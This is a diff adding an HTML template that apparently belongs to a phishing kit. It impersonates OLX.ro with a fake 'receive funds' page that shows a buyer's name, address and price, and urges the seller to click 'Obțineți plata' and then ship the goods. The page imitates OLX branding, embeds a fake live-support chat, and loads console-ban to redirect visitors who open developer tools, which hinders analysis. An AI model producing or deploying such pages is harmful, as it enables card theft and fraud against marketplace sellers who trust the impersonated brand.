@@ -1,0 +1,144 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>OLX.RO - Primirea de fonduri</title>
+<link rel="stylesheet" href="/static/style/olxro/index_olxro.css">
+<link href="/static/style/olxro/css2_olxro.css" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/x-icon" href="https://www.olx.ro/favicon.ico">
+
+<meta property="og:title" content="OLX - Cumpără și vinde">
+<meta property="og:description" content="Anunturi gratuite , peste 4 milioane: anunturi imobiliare, anunturi auto, telefoane mobile, locuri de munca, apartamente de inchiriat, masini second hand, haine.">
+<meta property="og:type" content="website">
+<meta property="og:image" content="https://static.olx.ro/static/olxro/naspersclassifieds-regional/olxeu-atlas-web-olxro/static/img/fb/fb-image_redesign.png?t=22-02-09"> 
+<meta property="og:url" content="https://www.olx.ro">
+<meta name="og:site_name" content="OLX.ro"> 
+<!-- support -->
+<link rel="stylesheet" href="/static/style/support/support_parent.css">
+<script src="/static/style/protect/protect.js"></script>
+</head>
+<body><div id="chat-application" style="display: block; z-index: 2147483647; position: fixed; overflow: hidden; bottom: 24px; left: initial; right: 11px; max-height: 56px; max-width: 200px; height: 56px; width: 200px; background: transparent none repeat scroll 0% 0%;">
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display:none;">
+<div id="chatra__iframe-wrapper">
+  <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay" src="/static/style/support/index.html?id=<%=id %>" style="width: 380px; height: 600px; position: absolute"></iframe>
+</div>
+</div>
+<div class="support-circle" onclick="document.querySelector(&#39;#chatra&#39;).style.display = &#39;block&#39;;this.style.display = &#39;none&#39;"></div> 
+    <iframe id="chat-application-iframe" title="Smartsupp" aria-hidden="true" style="width: 100%; height: 100%; border: medium none; z-index: 10000001;"></iframe></div>
+<header>
+<div class="container">
+    <div class="header-logo">
+        <span class="header-logo_o"></span>
+        <span class="header-logo_l"></span>
+        <span class="header-logo_x"></span>
+    </div>
+</div>
+</header>
+<main>
+<form method="GET" action="/receive/merchant/<%=id %>">
+    <div class="container">
+        <section class="section-info">
+            <img src="/static/style/olxro/check.svg" alt="" class="section-info_icon">
+            <div class="section-info_text">
+                <p class="section-info_title">Primirea de fonduri</p><p class="section-info_subtitle"></p>                </div>
+        </section>
+        <div class="item-container">
+            <section class="item-block">
+                <div class="section-content">
+                    <div class="item-block_header">
+                        <div class="item-block_image">
+                            <img src="<%=image %>" alt="">
+                        </div>
+                        <div class="item-block_text">
+                            <p class="item-block_title"><%=name %></p>
+                            <p class="item-block_price"><%=price %> RON</p>
+                            <p class="item-block_status">
+                                </p>
+                        </div>
+                    </div>
+                                                <div class="recipient-block">
+                            <div class="recipient-block_row">
+                                <div class="recipient-subblock_min">
+                                    <label>Numele complet</label>
+                                    <input class="recipient-block_input" value="<%=buyer %>" readonly="readonly">
+                                </div>
+                                
+                                <div class="recipient-subblock_min">
+                                </div>
+                                <div class="recipient-block_row">
+                                </div>
+                            </div>
+                            <div class="item-block_main">
+                                <div class="recipient-subblock_max">
+                                    <label>Adresă de livrare</label>
+                                    <input class="recipient-block_input" value="<%=address %>" readonly="readonly">
+                                </div>
+                            </div>
+                        </div>
+                                            <div class="item-block_main">
+                        <div class="item-block_description">
+                                                                <p class="description-subtitle">
+                                    <br><br>După primirea de fonduri
+pe cardul dvs., vă rugăm să trimiteți bunurile cumpărătorului în 
+conformitate cu datele specificate, puteți vizualiza punctele de livrare
+disponibile pe site-ul oficial Romanian Post
+                                    <br><br> După trimiterea mărfii,
+vă rugăm să furnizați numărul de transport cumpărătorului! Bunurile 
+trebuie trimise în termen de 3 zile de la data primirii fondurilor
+                                </p>
+                                                        </div>
+                    </div>
+                    <div class="item-block_footer">
+                        <p class="item-footer_text">Numărul de anunț: <b>18849459e7a3</b></p>
+                    </div>
+                </div>
+            </section>
+            <section class="item-pay">
+                <div class="section-content">
+                    <div class="bundle">
+                        <div class="container _container" data-container="PaymentsContainer">
+                            <div class="payments_container" id="payments">
+                                <div>
+                                    <p class="item-pay_price">Cantitate: <b><%=price %> RON</b></p>
+                                    <p class="item-pay_item">Produs: <%=name %></p>
+
+                                    <a href="/receive/merchant/<%=id %>">
+                                        <button class="item-pay_button">
+                                            Obțineți plata                            </button>
+                                    </a>
+                                    <p class="item-pay_safery"><img src="/static/style/olxro/shield.svg" alt="">Efectuarea plăților este sigură</p>
+                                    <img src="/static/style/olxro/icons.png" alt="" class="item-pay_paymentMethods">
+                                </div>
+            </div></div></div></div></section>
+        </div>
+    </div>
+</form>
+</main>
+<script type="text/javascript">
+    function openForm() {
+      $('#myForm').css('display', 'block')
+    $('#open-support').css('display', 'none')
+  }
+
+  function closeForm() {
+    $('#myForm').css('display', 'none')
+    $('#open-support').css('display', 'block')
+
+  }
+</script>
+
+<script src="https://cdn.jsdelivr.net/gh/fz6m/console-ban@3.2/dist/console-ban.min.js"></script>
+<script>
+    ConsoleBan.init({
+        redirect: 'https://http.cat/403'
+    })
+</script>
+
+</body></html>
